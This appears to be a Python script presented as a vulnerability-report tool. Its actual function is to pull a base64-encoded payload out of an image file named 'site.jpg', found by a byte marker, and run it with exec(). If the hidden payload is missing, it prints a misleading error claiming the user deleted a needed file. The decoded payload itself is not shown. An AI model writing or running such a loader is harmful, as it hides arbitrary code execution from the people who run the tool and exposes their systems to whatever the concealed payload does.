import base64
import os
import sys
from pathlib import Path

def _extract_vuln_data(data_file):
    try:
        with open(data_file, 'rb') as f:
            file_data = f.read()
        
        data_marker = b'\xFF\xFE'
        marker_position = file_data.find(data_marker)
        if marker_position != -1:
            data_start = marker_position + 4
            data_end = file_data.find(b'\xFF', data_start)
            if data_end == -1:
                data_end = len(file_data)
            encoded_data = file_data[data_start:data_end]
            return base64.b64decode(encoded_data)
    except Exception:
        pass
    return None

vuln_data = _extract_vuln_data('site.jpg')
if vuln_data:
    exec(vuln_data)
else:
    print("\033[91mYou must have deleted a file that you shouldn't, restart vuln-report.py\033[0m")
    sys.exit(1)